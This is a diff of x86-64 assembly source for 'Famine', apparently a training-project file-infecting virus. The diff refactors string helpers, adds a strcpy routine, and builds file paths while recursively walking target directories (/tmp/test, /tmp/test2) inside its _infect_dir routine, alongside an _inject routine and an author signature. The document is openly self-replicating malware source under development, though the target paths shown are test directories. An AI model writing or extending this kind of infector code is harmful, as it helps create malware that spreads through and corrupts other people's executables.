@@ -25,22 +25,14 @@ _start:
 
 newline db `\n`, 0x0
 
-_ft_strlen:; (string rdi) - use rcx, rsi
-	xor rcx, rcx; = 0
-	.loop_char:
-		cmp byte [rdi + rcx], 0
-		jz .return
-		inc rcx
-		jmp .loop_char
-	.return:
-ret
-
 _print:; (string rdi) - use rcx, rdi, rsi, rdx, rax, rbx(temp)
+	push rdx
 	push rbx
-	call _ft_strlen
+
+	call _ft_strlen; ft_strlen(rdi)
 	push rdi; mov rsi, rdi
 	pop rsi
-	push rcx; mov rdx, rcx
+	push rax
 	pop rdx
 	push 1; mov rax, 1
 	pop rax; write
@@ -58,26 +50,12 @@ _print:; (string rdi) - use rcx, rdi, rsi, rdx, rax, rbx(temp)
 	syscall
 	push rbx
 	pop rdi
+
 	pop rbx
+	pop rdx
 ret
 
 %endif; ========================================================================
-
-dotdir db `.`, 0x0, `..`, 0x0, 0x0
-
-_ft_strcmp: ; (string rdi, string rsi) - use rcx, rdi, rsi, rax
-	xor rcx, rcx; = 0
-	.loop_char:
-		mov al, [rdi + rcx]
-		cmp al, [rsi + rcx]
-		jne .return
-		cmp al, 0
-		je .return
-		inc rcx
-	jmp .loop_char
-	.return:
-		sub al, [rsi + rcx]
-ret
 
 _inject:
 	pop rdi; pop addr from stack
@@ -152,15 +130,13 @@ _infect_dir:; (string rdi)
 		; if not . .. +18
 		add rdi, 18; linux_dir->d_name
 		
-; ft_strcmp with '.' and '..' to not infect_dir with them
+		; ft_strcmp with '.' and '..' to not infect_dir with them
 		push rcx
 		lea rsi, [rel dotdir]
 		xor rcx, rcx; = 0
 		.loop_array_string:
 			add rsi, rcx
-			push rcx
 			call _ft_strcmp
-			pop rcx
 			cmp rax, 0
 			je .next_dir
 			xor rcx, rcx; = 0
@@ -172,11 +148,35 @@ _infect_dir:; (string rdi)
 			cmp byte[rsi + rcx], 0x0
 			jnz .loop_array_string
 
-		%ifdef DEBUG
-			push rdx
-			call _print; _print(rdi)
-			pop rdx
-		%endif
+			%ifdef DEBUG
+				call _print; _print(rdi)
+			%endif
+
+		.concat_path:
+			sub rsp, 4096
+			push rbx
+
+			push rdi
+			pop rbx
+			mov rsi, r10
+			mov rdi, rsp; buffer
+			call _ft_strcpy
+			call _ft_strlen
+			add rdi, rax
+			mov byte[rdi], '/'
+			add rdi, 1
+			mov rsi, rbx
+			call _ft_strcpy
+			mov rdi, rsp
+
+			; check infect_dir or infect_file
+
+			%ifdef DEBUG
+				call _print; _print(rdi)
+			%endif
+
+			pop rbx
+			add rsp, 4096
 
 		.next_dir:
 			pop rcx
@@ -225,7 +225,63 @@ _exit:
 	xor rdi, rdi; = 0
 	syscall
 
-directories db `/tmp/test/`, 0x0, `/tmp/test2/`, 0x0, 0x0
+; ================================ utils =======================================
+
+_ft_strlen:; (string rdi) - use rcx, rsi
+	push rcx
+
+	xor rcx, rcx; = 0
+	.loop_char:
+		cmp byte [rdi + rcx], 0
+		jz .return
+		inc rcx
+		jmp .loop_char
+	.return:
+		push rcx
+		pop rax
+
+		pop rcx
+ret
+
+_ft_strcmp: ; (string rdi, string rsi) - use rcx, rdi, rsi, rax
+	push rcx
+
+	xor rcx, rcx; = 0
+	.loop_char:
+		mov al, [rdi + rcx]
+		cmp al, [rsi + rcx]
+		jne .return
+		cmp al, 0x0
+		je .return
+		inc rcx
+	jmp .loop_char
+	.return:
+		sub al, [rsi + rcx]
+
+	pop rcx
+ret
+
+_ft_strcpy: ; (string rdi, string rsi)
+	push rcx
+
+	xor rcx, rcx; = 0
+	.loop_char:
+		mov al, [rsi + rcx]
+		mov [rdi + rcx], al
+		cmp byte[rsi + rcx], 0x0
+		je .return
+		inc rcx
+	jmp .loop_char
+	.return:
+		mov rax, rdi
+
+	pop rcx
+ret
+
+; ==============================================================================
+
+dotdir db `.`, 0x0, `..`, 0x0, 0x0
+directories db `/tmp/test`, 0x0, `/tmp/test2`, 0x0, 0x0
 db `Famine version 1.0 (c)oded by lmartin`; sw4g signature
 
 _check_end:
